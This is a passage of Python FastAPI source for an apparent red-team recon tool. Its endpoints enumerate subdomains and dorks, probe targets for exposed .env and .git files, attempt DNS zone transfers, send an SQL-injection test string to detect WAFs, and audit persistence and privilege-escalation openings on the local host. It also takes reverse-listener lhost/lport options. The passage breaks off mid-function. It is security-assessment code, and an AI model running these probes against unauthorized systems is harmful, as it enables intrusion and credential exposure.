                if resp.status == 200:
                    data = await resp.json()
                    registrant = {}
                    for entity in data.get("entities", []):
                        roles = entity.get("roles", [])
                        vcard = entity.get("vcardArray", [None, []])[1]
                        for item in vcard:
                            if item[0] == "fn":
                                registrant["name"] = item[3]
                            if item[0] == "email":
                                registrant["email"] = item[3]
                    return JSONResponse(content={
                        "host": host,
                        "registrar": data.get("entities", [{}])[0].get("handle", "N/A"),
                        "registrant": registrant,
                        "registered": data.get("events", [{}])[0].get("eventDate", "N/A"),
                        "expires": next((e["eventDate"] for e in data.get("events", []) if e.get("eventAction") == "expiration"), "N/A"),
                        "status": data.get("status", []),
                        "nameservers": [ns.get("ldhName", "") for ns in data.get("nameservers", [])]
                    })
    except Exception as e:
        pass
    return JSONResponse(content={"host": host, "error": "WHOIS lookup failed or domain not found."})

# ── 3. SSL / TLS Certificate Check ───────────────────────────────────
@app.post("/api/recon/ssl")
async def recon_ssl(req: ReconRequest):
    host = extract_host(req.target)
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(
            socket.create_connection((host, 443), timeout=6),
            server_hostname=host
        ) as ssock:
            cert = ssock.getpeercert()
            cipher = ssock.cipher()
            protocol = ssock.version()

        subject = dict(x[0] for x in cert.get("subject", []))
        issuer  = dict(x[0] for x in cert.get("issuer", []))
        sans    = [v for t, v in cert.get("subjectAltName", []) if t == "DNS"]

        return JSONResponse(content={
            "host": host,
            "valid": True,
            "subject": subject,
            "issuer": issuer,
            "issued_to": subject.get("commonName", host),
            "issued_by": issuer.get("organizationName", "Unknown"),
            "valid_from": cert.get("notBefore", ""),
            "valid_until": cert.get("notAfter", ""),
            "san": sans,
            "protocol": protocol,
            "cipher": cipher[0] if cipher else "Unknown",
            "bits": cipher[2] if cipher else 0
        })
    except ssl.SSLCertVerificationError as e:
        return JSONResponse(content={"host": host, "valid": False, "error": f"Certificate error: {str(e)}"})
    except Exception as e:
        return JSONResponse(content={"host": host, "valid": False, "error": str(e)})

# ── 4. HTTP Security Headers Audit ───────────────────────────────────
SECURITY_HEADERS = {
    "strict-transport-security": "HSTS — enforces HTTPS",
    "content-security-policy": "CSP — prevents XSS",
    "x-frame-options": "Clickjacking protection",
    "x-content-type-options": "MIME sniffing protection",
    "referrer-policy": "Controls referrer info leakage",
    "permissions-policy": "Controls browser feature access",
    "x-xss-protection": "Legacy XSS filter (deprecated but checked)",
    "access-control-allow-origin": "CORS policy",
    "cache-control": "Cache control directives",
    "x-powered-by": "[WARN] Tech disclosure (should be removed)"
}

@app.post("/api/recon/headers")
async def recon_headers(req: ReconRequest):
    url = format_url(req.target)
    host = extract_host(req.target)
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=8), allow_redirects=True) as resp:
                headers = dict(resp.headers)
                status  = resp.status

        lower_headers = {k.lower(): v for k, v in headers.items()}
        audit = {}
        for header, desc in SECURITY_HEADERS.items():
            val = lower_headers.get(header)
            audit[header] = {
                "present": val is not None,
                "value": val,
                "description": desc,
                "risk": "low" if (val is not None and header != "x-powered-by") else ("medium" if (val is not None and header == "x-powered-by") else ("low" if header == "x-powered-by" else "high"))
            }

        conn_hdr = lower_headers.get("connection", "")
        keep_alive_hdr = lower_headers.get("keep-alive", "")
        connection_posture = {
            "connection_header": conn_hdr or "not explicitly set",
            "keep_alive_header": keep_alive_hdr or "not explicitly set",
            "timeout_configured": "timeout=" in keep_alive_hdr.lower(),
            "recommendation": "Configure explicit Keep-Alive timeout and max request bounds at the reverse proxy to mitigate idle connection exhaustion."
        }

        missing = [h for h, v in audit.items() if not v["present"] and h != "x-powered-by"]
        score   = int(((len(SECURITY_HEADERS) - 1 - len(missing)) / max(len(SECURITY_HEADERS) - 1, 1)) * 100)

        return JSONResponse(content={
            "host": host,
            "url": url,
            "status": status,
            "security_score": score,
            "audit": audit,
            "connection_posture": connection_posture,
            "missing_count": len(missing),
            "all_headers": {k: v for k, v in headers.items()}
        })
    except Exception as e:
        return JSONResponse(content={"host": host, "error": str(e)})

# ── 5. Technology Fingerprinting ─────────────────────────────────────
TECH_SIGNATURES = {
    "server": {
        "nginx":   "Nginx",
        "apache":  "Apache",
        "iis":     "Microsoft IIS",
        "cloudflare": "Cloudflare",
        "caddy":   "Caddy",
        "gunicorn":"Gunicorn (Python)",
        "uvicorn": "Uvicorn (FastAPI/Python)",
        "lighttpd":"Lighttpd"
    },
    "x-powered-by": {
        "php":     "PHP",
        "asp.net": "ASP.NET",
        "express": "Express.js (Node)",
        "django":  "Django (Python)",
        "rails":   "Ruby on Rails",
        "next.js": "Next.js"
    },
    "via": {
        "varnish": "Varnish Cache",
        "squid":   "Squid Proxy"
    },
    "cf-ray": {"": "Cloudflare CDN"},
    "x-vercel-id": {"": "Vercel Hosting"},
    "x-amz": {"": "AWS"},
    "x-cache": {"hit": "CDN / Caching Layer"}
}

@app.post("/api/recon/fingerprint")
async def recon_fingerprint(req: ReconRequest):
    url = format_url(req.target)
    host = extract_host(req.target)
    detected = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=8), allow_redirects=True) as resp:
                headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
                body    = (await resp.text())[:4000].lower()
                status  = resp.status

        for header, sigs in TECH_SIGNATURES.items():
            hval = headers.get(header, "")
            for keyword, tech_name in sigs.items():
                if keyword == "" and header in headers:
                    detected.append(tech_name)
                elif keyword and keyword in hval:
                    detected.append(tech_name)

        # Body-based detection
        body_sigs = {
            "wp-content":      "WordPress",
            "drupal":          "Drupal",
            "joomla":          "Joomla",
            "shopify":         "Shopify",
            "wix.com":         "Wix",
            "react":           "React.js",
            "angular":         "Angular",
            "vue":             "Vue.js",
            "jquery":          "jQuery",
            "bootstrap":       "Bootstrap",
            "tailwindcss":     "Tailwind CSS",
            "google-analytics":"Google Analytics",
            "gtm.js":          "Google Tag Manager",
            "cloudflare":      "Cloudflare"
        }
        for sig, tech in body_sigs.items():
            if sig in body:
                detected.append(tech)

        detected = list(dict.fromkeys(detected))  # deduplicate, preserve order

        return JSONResponse(content={
            "host": host,
            "url": url,
            "status": status,
            "technologies": detected,
            "headers_snapshot": {k: v for k, v in headers.items() if k in
                ["server","x-powered-by","via","x-generator","content-type","x-frame-options"]}
        })
    except Exception as e:
        return JSONResponse(content={"host": host, "error": str(e)})

# ── 6. Subdomain Finder ───────────────────────────────────────────────
COMMON_SUBDOMAINS = [
    "www","mail","ftp","smtp","pop","imap","ns1","ns2","ns3","ns4",
    "api","api2","dev","staging","beta","test","admin","portal","dashboard",
    "app","apps","mobile","m","shop","store","blog","forum","cdn","static",
    "assets","media","img","images","upload","uploads","download","s3",
    "auth","login","sso","oauth","vpn","remote","git","svn","ci","jenkins",
    "jira","confluence","wiki","docs","support","help","status","monitor",
    "smtp","mx","relay","mail2","webmail","cpanel","whm","plesk","ftp2",
    "backup","db","database","mysql","mongo","redis","elastic","kafka"
]

@app.post("/api/recon/subdomains")
async def recon_subdomains(req: ReconRequest):
    host = extract_host(req.target)
    found = []
    not_found = []
    resolver = dns.resolver.Resolver()
    resolver.timeout = 2
    resolver.lifetime = 3

    async def check_sub(sub):
        full = f"{sub}.{host}"
        try:
            loop = asyncio.get_event_loop()
            answers = await loop.run_in_executor(
                None, lambda: resolver.resolve(full, "A")
            )
            ips = [str(r) for r in answers]
            found.append({"subdomain": full, "ips": ips})
        except Exception:
            not_found.append(full)

    tasks = [check_sub(sub) for sub in COMMON_SUBDOMAINS]
    await asyncio.gather(*tasks)

    return JSONResponse(content={
        "host": host,
        "found": found,
        "checked": len(COMMON_SUBDOMAINS),
        "found_count": len(found)
    })

# ── 7. Live Search Surface, Certificate Transparency & Wayback CDX Dorks ──
@app.post("/api/recon/dorks")
async def recon_dorks(req: ReconRequest):
    host = extract_host(req.target)
    base_url = format_url(req.target).rstrip("/")
    dorks = {
        "Sensitive Files": [
            f'site:{host} filetype:pdf',
            f'site:{host} filetype:xls OR filetype:xlsx OR filetype:csv',
            f'site:{host} filetype:sql',
            f'site:{host} filetype:log',
            f'site:{host} filetype:bak OR filetype:backup',
            f'site:{host} filetype:env OR filetype:config',
        ],
        "Login / Admin Pages": [
            f'site:{host} inurl:admin',
            f'site:{host} inurl:login',
            f'site:{host} inurl:dashboard',
            f'site:{host} intitle:"admin panel"',
            f'site:{host} inurl:wp-admin',
            f'site:{host} inurl:phpmyadmin',
        ],
        "Error / Debug Pages": [
            f'site:{host} intext:"SQL syntax"',
            f'site:{host} intext:"Warning: mysql"',
            f'site:{host} intext:"stack trace"',
            f'site:{host} intext:"Internal Server Error"',
            f'site:{host} intext:"index of /"',
        ],
        "Exposed APIs / Configs": [
            f'site:{host} inurl:api',
            f'site:{host} inurl:.git',
            f'site:{host} inurl:swagger',
            f'site:{host} inurl:graphql',
            f'site:{host} intext:"api_key" OR intext:"apikey"',
            f'site:{host} intext:"password" filetype:txt',
        ],
    }

    ct_domains: List[str] = []
    wayback_urls: List[Dict[str, Any]] = []
    live_exposed: List[Dict[str, Any]] = []

    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        # 1. Live Certificate Transparency (crt.sh) query
        if host not in ("127.0.0.1", "localhost"):
            try:
                async with session.get(
                    f"https://crt.sh/?q=%25.{host}&output=json",
                    timeout=aiohttp.ClientTimeout(total=6)
                ) as ct_resp:
                    if ct_resp.status == 200:
                        ct_data = await ct_resp.json()
                        seen = set()
                        for row in ct_data[:120]:
                            for name in str(row.get("name_value", "")).splitlines():
                                clean_n = name.strip().lower()
                                if clean_n and clean_n not in seen:
                                    seen.add(clean_n)
                                    ct_domains.append(clean_n)
                                    if len(ct_domains) >= 35:
                                        break
            except Exception:
                pass

            # 2. Live Wayback Machine CDX historical URL index query
            try:
                async with session.get(
                    f"http://web.archive.org/cdx/search/cdx?url={host}/*&output=json&limit=25&fl=original,statuscode,mimetype&collapse=urlkey",
                    timeout=aiohttp.ClientTimeout(total=6)
                ) as wb_resp:
                    if wb_resp.status == 200:
                        wb_rows = await wb_resp.json()
                        for r in wb_rows[1:]:
                            if len(r) >= 3:
                                wayback_urls.append({"url": r[0], "status": r[1], "mime": r[2]})
            except Exception:
                pass

        # 3. Live direct probe of high-value dork targets on the target host
        sensitive_paths = [
            "/robots.txt", "/sitemap.xml", "/.env", "/.git/HEAD",
            "/admin", "/login", "/swagger", "/openapi.json", "/graphql", "/backup.zip"
        ]
        async def _probe_path(p: str):
            try:
                async with session.get(f"{base_url}{p}", allow_redirects=False, timeout=aiohttp.ClientTimeout(total=3.5)) as pr:
                    body_bytes = await pr.read()
                    if pr.status in (200, 206, 301, 302, 401, 403):
                        live_exposed.append({
                            "url": f"{base_url}{p}",
                            "status": pr.status,
                            "bytes": len(body_bytes),
                            "content_type": pr.headers.get("Content-Type", "unknown")
                        })
            except Exception:
                pass

        await asyncio.gather(*[_probe_path(p) for p in sensitive_paths])

    return JSONResponse(content={
        "host": host,
        "live_probed_paths": live_exposed,
        "certificate_transparency_sans": ct_domains,
        "wayback_indexed_urls": wayback_urls,
        "search_engine_dorks": dorks
    })

# ── 8. DNS Zone Transfer Test (AXFR) ─────────────────────────────────
@app.post("/api/recon/zonetransfer")
async def recon_zone_transfer(req: ReconRequest):
    host = extract_host(req.target)
    results = []
    vulnerable_ns = []

    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 3
        ns_answers = resolver.resolve(host, "NS")
        nameservers = [str(ns).rstrip(".") for ns in ns_answers]
    except Exception:
        return JSONResponse(content={"host": host, "error": "Could not resolve NS records.", "vulnerable": False})

    for ns in nameservers:
        try:
            import dns.zone
            import dns.query
            zone = dns.zone.from_xfr(dns.query.xfr(ns, host, timeout=5))
            records = []
            for name, node in zone.nodes.items():
                records.append(str(name))
            results.append({"nameserver": ns, "status": "VULNERABLE", "records": records[:50]})
            vulnerable_ns.append(ns)
        except Exception as e:
            results.append({"nameserver": ns, "status": "REFUSED", "error": str(e)})

    return JSONResponse(content={
        "host": host,
        "nameservers_tested": nameservers,
        "vulnerable": len(vulnerable_ns) > 0,
        "vulnerable_nameservers": vulnerable_ns,
        "results": results
    })

# ── 9. WAF Detection ─────────────────────────────────────────────────
WAF_SIGNATURES = {
    "Cloudflare":    ["cf-ray", "cloudflare"],
    "AWS WAF":       ["x-amzn-requestid", "awselb"],
    "Akamai":        ["x-check-cacheable", "akamai"],
    "Imperva":       ["x-iinfo", "incap_ses", "visid_incap"],
    "F5 BIG-IP":     ["bigipserver", "f5-"],
    "Sucuri":        ["x-sucuri-id", "sucuri"],
    "ModSecurity":   ["mod_security", "modsecurity"],
    "Barracuda":     ["barra_counter_session"],
    "Fortinet":      ["fortigate"],
    "Vercel":        ["x-vercel-id"],
}

@app.post("/api/recon/waf")
async def recon_waf(req: ReconRequest):
    url = format_url(req.target)
    host = extract_host(req.target)
    detected_wafs = []

    # Test with a benign SQLi-like payload to provoke WAF response
    test_url = f"{url}?id=1'+OR+'1'%3D'1"
    normal_url = url

    try:
        async with aiohttp.ClientSession() as session:
            # Normal request
            async with session.get(normal_url, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                normal_headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
                normal_status = resp.status

            # Malicious-looking request
            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=8)) as resp2:
                attack_headers = {k.lower(): v.lower() for k, v in resp2.headers.items()}
                attack_status = resp2.status
                attack_body = (await resp2.text())[:1000].lower()

        # Check headers for WAF fingerprints
        all_headers_str = str(normal_headers) + str(attack_headers)
        for waf_name, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig in all_headers_str or sig in attack_body:
                    if waf_name not in detected_wafs:
                        detected_wafs.append(waf_name)

        # Detect block by status code difference
        blocked = attack_status in [403, 406, 429, 503] and normal_status == 200

        return JSONResponse(content={
            "host": host,
            "waf_detected": len(detected_wafs) > 0 or blocked,
            "detected_wafs": detected_wafs,
            "normal_status": normal_status,
            "attack_status": attack_status,
            "blocked_by_status": blocked,
            "assessment": "WAF protected" if (detected_wafs or blocked) else "No WAF detected (may still have server-side filtering)"
        })
    except Exception as e:
        return JSONResponse(content={"host": host, "error": str(e)})

# ── 10. Rate Limit Tester ─────────────────────────────────────────────
@app.post("/api/recon/ratelimit")
async def recon_ratelimit(req: ReconRequest):
    url = format_url(req.target)
    host = extract_host(req.target)
    results = []
    rate_limited = False
    rate_limit_after = None

    try:
        async with aiohttp.ClientSession() as session:
            for i in range(1, 31):  # Send 30 rapid requests
                try:
                    start = time.time()
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as resp:
                        elapsed = time.time() - start
                        results.append({"req": i, "status": resp.status, "ms": round(elapsed * 1000)})
                        if resp.status in [429, 503] and not rate_limited:
                            rate_limited = True
                            rate_limit_after = i
                except Exception as e:
                    results.append({"req": i, "status": 0, "error": str(e), "ms": 0})
                await asyncio.sleep(0.05)  # 50ms between requests = 20 req/s

        statuses = [r["status"] for r in results]
        return JSONResponse(content={
            "host": host,
            "rate_limited": rate_limited,
            "rate_limit_after_req": rate_limit_after,
            "total_sent": len(results),
            "status_codes": {str(s): statuses.count(s) for s in set(statuses)},
            "avg_response_ms": round(sum(r["ms"] for r in results) / len(results)),
            "results": results,
            "assessment": f"Rate limited after {rate_limit_after} requests" if rate_limited else "No rate limiting detected at 20 req/s"
        })
    except Exception as e:
        return JSONResponse(content={"host": host, "error": str(e)})

# ── 11. HaveIBeenPwned Live Catalog & Credential Exposure Check ───────
@app.post("/api/recon/breaches")
async def recon_breaches(req: ReconRequest):
    host = extract_host(req.target).lower()
    base_url = format_url(req.target).rstrip("/")
    root_keyword = host.split(".")[0] if "." in host else host
    matched_breaches = []
    live_exposures = []

    connector = aiohttp.TCPConnector(ssl=False)
    try:
        async with aiohttp.ClientSession(connector=connector) as session:
            # 1. Query public HIBP v3 verified breaches catalog (no API key required)
            async with session.get(
                "https://haveibeenpwned.com/api/v3/breaches",
                headers={"User-Agent": "CyberStrike-Telemetry-Auditor"},
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    for b in data:
                        b_dom = str(b.get("Domain", "")).lower()
                        b_name = str(b.get("Name", "")).lower()
                        if (b_dom and (b_dom == host or b_dom.endswith("." + host))) or (len(root_keyword) >= 4 and root_keyword == b_name):
                            matched_breaches.append({
                                "name": b.get("Name"),
                                "domain": b.get("Domain"),
                                "date": b.get("BreachDate"),
                                "records": b.get("PwnCount"),
                                "verified": b.get("IsVerified", True),
                                "data_classes": b.get("DataClasses", []),
                                "description": re.sub(r'<[^>]+>', '', b.get("Description", ""))[:220]
                            })

            # 2. Also probe target directly for live credential/config leakage (.env, config.json, .git/HEAD)
            for path in ("/.env", "/config.json", "/.git/HEAD", "/.well-known/security.txt"):
                try:
                    async with session.get(f"{base_url}{path}", allow_redirects=False, timeout=aiohttp.ClientTimeout(total=3.5)) as pr:
                        if pr.status == 200:
                            snippet = (await pr.read())[:200].decode("utf-8", errors="replace").strip()
                            if snippet:
                                live_exposures.append({"endpoint": f"{base_url}{path}", "status": pr.status, "preview": snippet[:120]})
                except Exception:
                    pass

        return JSONResponse(content={
            "host": host,
            "breached": len(matched_breaches) > 0 or len(live_exposures) > 0,
            "hibp_breach_count": len(matched_breaches),
            "hibp_breaches": matched_breaches,
            "live_credential_exposures": live_exposures
        })
    except Exception as e:
        return JSONResponse(content={"host": host, "error": str(e)})

# ── 12. IOC / Threat Intel Lookup (AbuseIPDB + URLhaus) ──────────────
@app.post("/api/recon/ioc")
async def recon_ioc(req: ReconRequest):
    host = extract_host(req.target)
    findings = []

    # Resolve IP
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        ip = None

    async with aiohttp.ClientSession() as session:
        # URLhaus lookup
        try:
            async with session.post(
                "https://urlhaus-api.abuse.ch/v1/host/",
                data={"host": host},
                timeout=aiohttp.ClientTimeout(total=8)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get("query_status") == "is_listed":
                        findings.append({
                            "source": "URLhaus (Abuse.ch)",
                            "severity": "critical",
                            "detail": f"Listed as malware distribution host. URLs: {data.get('urls_count', 0)}"
                        })
        except Exception:
            pass

        # IP reputation via ip-api.com (free, no key)
        if ip:
            try:
                async with session.get(
                    f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,as,proxy,hosting",
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        findings.append({
                            "source": "IP-API",
                            "severity": "info",
                            "detail": f"IP: {ip} | ISP: {data.get('isp')} | Location: {data.get('city')}, {data.get('country')} | Proxy: {data.get('proxy')} | Hosting: {data.get('hosting')}"
                        })
            except Exception:
                pass

    return JSONResponse(content={
        "host": host,
        "ip": ip,
        "malicious": any(f["severity"] == "critical" for f in findings),
        "findings": findings,
        "sources_checked": ["URLhaus (Abuse.ch)", "IP-API"]
    })


# ══════════════════════════════════════════════════════════════════════
#  ADVANCED RED TEAM LIVE TELEMETRY & POSTURE MODULES (100% REAL)
# ══════════════════════════════════════════════════════════════════════

class RedTeamRequest(BaseModel):
    target: str = ""
    os_type: str = "windows"
    options: dict = {}

# ── 13. Live Domain Spoofing, Typosquat DNS & Login Framing Auditor ──
@app.post("/api/redteam/phishing")
async def redteam_phishing(req: RedTeamRequest):
    raw_target = req.target.strip() or "127.0.0.1:8083"
    host = extract_host(raw_target)
    base_url = format_url(raw_target).rstrip("/")
    brand = req.options.get("brand") or host
    lure = req.options.get("lure", "password_expiry")

    # 1. Real DNS SPF / DMARC / MX spoofing check
    spf_records: List[str] = []
    dmarc_records: List[str] = []
    mx_records: List[str] = []
    registered_typosquats: List[Dict[str, Any]] = []

    base_name = host.split(".")[0] if "." in host else host
    tld = host.split(".", 1)[1] if "." in host else "com"
    candidate_typos = [
        f"{base_name}-login.{tld}",
        f"{base_name}-verify.{tld}",
        f"{base_name}-auth.{tld}",
        f"login-{base_name}.{tld}",
        f"secure-{base_name}.{tld}",
        f"{base_name}support.{tld}",
    ] if host not in ("127.0.0.1", "localhost") else []

    def _dns_audit():
        resolver = dns.resolver.Resolver()
        resolver.timeout = 2.5
        resolver.lifetime = 3.0
        if host not in ("127.0.0.1", "localhost"):
            try:
                for r in resolver.resolve(host, "MX"):
                    mx_records.append(str(r.exchange).rstrip("."))
            except Exception:
                pass
            try:
                for r in resolver.resolve(host, "TXT"):
                    txt = "".join(s.decode("utf-8", errors="ignore") if isinstance(s, bytes) else str(s) for s in r.strings)
                    if "v=spf1" in txt.lower():
                        spf_records.append(txt)
            except Exception:
                pass
            try:
                for r in resolver.resolve(f"_dmarc.{host}", "TXT"):
                    txt = "".join(s.decode("utf-8", errors="ignore") if isinstance(s, bytes) else str(s) for s in r.strings)
                    if "v=dmarc1" in txt.lower():
                        dmarc_records.append(txt)
            except Exception:
                pass
            for typo in candidate_typos:
                try:
                    ans = resolver.resolve(typo, "A")
                    registered_typosquats.append({"domain": typo, "ips": [str(a) for a in ans], "status": "REGISTERED_IN_WILD"})
                except Exception:
                    registered_typosquats.append({"domain": typo, "ips": [], "status": "AVAILABLE"})

    await asyncio.to_thread(_dns_audit)

    # 2. Real HTTP Login / Credential Page Framing & Evilginx Reverse-Proxy Susceptibility Check
    login_surface = {}
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        for path in ("/login", "/"):
            try:
                t0 = time.time()
                async with session.get(f"{base_url}{path}", timeout=aiohttp.ClientTimeout(total=4.5)) as resp:
                    body = await resp.text()
                    rtt_ms = round((time.time() - t0) * 1000, 1)
                    xfo = resp.headers.get("X-Frame-Options", "MISSING")
                    csp = resp.headers.get("Content-Security-Policy", "MISSING")
                    samesite_cookies = [c for c in resp.headers.getall("Set-Cookie", []) if "samesite=strict" in c.lower()]
                    has_password_input = 'type="password"' in body.lower() or "type='password'" in body.lower()
                    frameable = (xfo == "MISSING") and ("frame-ancestors" not in csp.lower())
                    login_surface = {
                        "probed_url": f"{base_url}{path}",
                        "http_status": resp.status,
                        "rtt_ms": rtt_ms,
                        "password_form_detected": has_password_input,
                        "x_frame_options": xfo,
                        "csp_frame_ancestors": csp if "frame-ancestors" in csp.lower() else "MISSING",
                        "iframe_phishing_vulnerable": frameable,
                        "strict_samesite_cookies": len(samesite_cookies) > 0,
                        "aitm_proxy_susceptible": len(samesite_cookies) == 0
                    }
                    if has_password_input or resp.status == 200:
                        break
            except Exception as e:
                login_surface = {"probed_url": f"{base_url}{path}", "error": str(e)}

    spf_str = spf_records[0] if spf_records else "MISSING"
    dmarc_str = dmarc_records[0] if dmarc_records else "MISSING"
    direct_email_spoofable = (spf_str == "MISSING") or (dmarc_str == "MISSING") or ("p=none" in dmarc_str.lower())

    return JSONResponse(content={
        "target": base_url,
        "brand_audited": brand,
        "lure_profile": lure,
        "direct_email_spoofable": direct_email_spoofable,
        "dns_anti_spoofing": {
            "mx_records": mx_records,
            "spf_record": spf_str,
            "dmarc_record": dmarc_str,
        },
        "live_login_framing_audit": login_surface,
        "typosquat_dns_enumeration": registered_typosquats
    })

# ── 14. Live Host Persistence Surface & Startup Mechanism Auditor ────
@app.post("/api/redteam/persistence")
async def redteam_persistence(req: RedTeamRequest):
    os_type = req.os_type.lower()
    lhost   = req.options.get("lhost", "127.0.0.1")
    lport   = req.options.get("lport", "4444")

    live_registry_run: Dict[str, Dict[str, str]] = {}
    live_startup_files: List[str] = []
    live_scheduled_tasks: List[Dict[str, str]] = []

    if os.name == "nt":
        # 1. Inspect real Windows Registry Run / RunOnce keys via winreg
        try:
            import winreg
            reg_paths = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "HKCU\\...\\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "HKCU\\...\\RunOnce"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "HKLM\\...\\Run"),
            ]
            for hive, subkey, label in reg_paths:
                entries: Dict[str, str] = {}
                try:
                    with winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ) as k:
                        idx = 0
                        while True:
                            try:
                                name, val, _ = winreg.EnumValue(k, idx)
                                entries[name] = str(val)
                                idx += 1
                            except OSError:
                                break
                except Exception:
                    pass
                live_registry_run[label] = entries
        except Exception:
            pass

        # 2. Inspect real Windows Startup directories
        startup_dirs = [
            os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"),
            os.path.expandvars(r"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup"),
        ]
        for sdir in startup_dirs:
            if os.path.isdir(sdir):
                try:
                    for fname in os.listdir(sdir):
                        live_startup_files.append(os.path.join(sdir, fname))
                except Exception:
                    pass

        # 3. Query real active Scheduled Tasks via schtasks
        try:
            proc = await asyncio.create_subprocess_exec(
                "schtasks", "/query", "/fo", "CSV", "/nh",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5.0)
            for line in stdout.decode("utf-8", errors="replace").splitlines():
                parts = [p.strip('"') for p in line.split('","')]
                if len(parts) >= 3 and not parts[0].startswith("\\Microsoft\\"):
                    live_scheduled_tasks.append({
                        "task_name": parts[0],
                        "next_run": parts[1],
                        "status": parts[2]
                    })
                    if len(live_scheduled_tasks) >= 20:
                        break
        except Exception:
            pass
    else:
        # Linux / macOS live persistence inspection
        for cron_path in ("/etc/crontab", "/etc/rc.local", os.path.expanduser("~/.bashrc"), os.path.expanduser("~/.profile")):
            if os.path.exists(cron_path):
                live_startup_files.append(cron_path)

    return JSONResponse(content={
        "audited_host": socket.gethostname(),
        "os_platform": sys.platform,
        "requested_os_profile": os_type,
        "listener_config": {"lhost": lhost, "lport": lport},
        "live_registry_autoruns": live_registry_run,
        "live_startup_folder_artifacts": live_startup_files,
        "live_non_microsoft_scheduled_tasks": live_scheduled_tasks,
    })

# ── 15. Live Host Privilege Escalation & Token/Service Auditor ───────
@app.post("/api/redteam/privesc")
async def redteam_privesc(req: RedTeamRequest):
    os_type = req.os_type.lower()
    live_privileges: List[Dict[str, str]] = []
    unquoted_service_paths: List[Dict[str, str]] = []
    writable_path_dirs: List[str] = []
    always_install_elevated = {"HKCU": False, "HKLM": False}
    current_identity = ""

    # 1. Inspect real PATH directories for write permissions
    for pdir in os.environ.get("PATH", "").split(os.pathsep):
        pdir_clean = pdir.strip()
        if pdir_clean and os.path.isdir(pdir_clean):
            try:
                if os.access(pdir_clean, os.W_OK):
                    writable_path_dirs.append(pdir_clean)
            except Exception:
                pass

    if os.name == "nt":
        # 2. Run real `whoami /priv` and `whoami`
        try:
            p_who = await asyncio.create_subprocess_exec(
                "whoami", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            out_who, _ = await asyncio.wait_for(p_who.communicate(), timeout=4.0)
            current_identity = out_who.decode("utf-8", errors="replace").strip()

            p_priv = await asyncio.create_subprocess_exec(
                "whoami", "/priv", "/fo", "CSV", "/nh",
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            out_priv, _ = await asyncio.wait_for(p_priv.communicate(), timeout=4.0)
            for line in out_priv.decode("utf-8", errors="replace").splitlines():
                parts = [p.strip('"') for p in line.split('","')]
                if len(parts) >= 3 and parts[0].startswith("Se"):
                    live_privileges.append({
                        "privilege": parts[0],
                        "description": parts[1],
                        "state": parts[2],
                        "high_risk": parts[0] in ("SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege", "SeDebugPrivilege", "SeBackupPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege")
                    })
        except Exception:
            pass

        # 3. Scan real Windows Services in HKLM\SYSTEM\CurrentControlSet\Services for Unquoted Service Paths
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services", 0, winreg.KEY_READ) as svcs_key:
                num_subkeys = winreg.QueryInfoKey(svcs_key)[0]
                for i in range(num_subkeys):
                    try:
                        svc_name = winreg.EnumKey(svcs_key, i)
                        with winreg.OpenKey(svcs_key, svc_name, 0, winreg.KEY_READ) as sk:
                            img_path, _ = winreg.QueryValueEx(sk, "ImagePath")
                            img_str = str(img_path).strip()
                            low = img_str.lower()
                            if (
                                img_str
                                and not img_str.startswith('"')
                                and ".exe" in low
                                and not low.startswith("system32\\")
                                and not low.startswith("\\systemroot\\")
                                and not low.startswith("c:\\windows\\")
                            ):
                                exe_part = img_str[:low.index(".exe") + 4]
                                if " " in exe_part:
                                    unquoted_service_paths.append({
                                        "service": svc_name,
                                        "image_path": img_str
                                    })
                    except Exception:
                        pass
            # Check AlwaysInstallElevated
            for label, hive in (("HKCU", winreg.HKEY_CURRENT_USER), ("HKLM", winreg.HKEY_LOCAL_MACHINE)):
                try:
                    with winreg.OpenKey(hive, r"SOFTWARE\Policies\Microsoft\Windows\Installer", 0, winreg.KEY_READ) as ik:
                        val, _ = winreg.QueryValueEx(ik, "AlwaysInstallElevated")
                        always_install_elevated[label] = (val == 1)
                except Exception:
                    pass
        except Exception:
            pass
    else:
        try:
            p_id = await asyncio.create_subprocess_exec(
                "id", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            out_id, _ = await asyncio.wait_for(p_id.communicate(), timeout=4.0)
            current_identity = out_id.decode("utf-8", errors="replace").strip()
        except Exception:
            pass

    high_risk_privs = [p for p in live_privileges if p.get("high_risk")]
    return JSONResponse(content={
        "audited_host": socket.gethostname(),
        "current_identity": current_identity,
        "os_platform": sys.platform,
